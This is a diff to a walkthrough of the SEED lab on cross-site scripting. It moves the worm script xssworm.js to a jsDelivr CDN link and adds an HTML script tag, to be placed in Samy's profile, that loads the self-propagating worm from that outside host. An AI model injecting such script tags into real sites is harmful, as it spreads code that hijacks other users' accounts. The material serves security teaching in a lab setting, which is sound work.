@@ -276,7 +276,13 @@ Edit Boby's profile as the code above. Then sign-in as Boby to view his profile 
 
 ## Link Approach
 
-Write the JavaScript code [`xssworm.js`](./xssworm.js) and store it in the external link https://github.com/li-xin-yi/seedlab/raw/master/Cross-Site-Scripting-Attack/xssworm.js
+Write the JavaScript file [`xssworm.js`](./xssworm.js) and store it in the external link https://cdn.jsdelivr.net/gh/li-xin-yi/seedlab/Cross-Site-Scripting-Attack/xssworm.js
 
+Add it into Samy's profile:
 
-
+```html
+<script
+  type="text/javascript"
+  src="https://cdn.jsdelivr.net/gh/li-xin-yi/seedlab/Cross-Site-Scripting-Attack/xssworm.js"
+></script>
+```
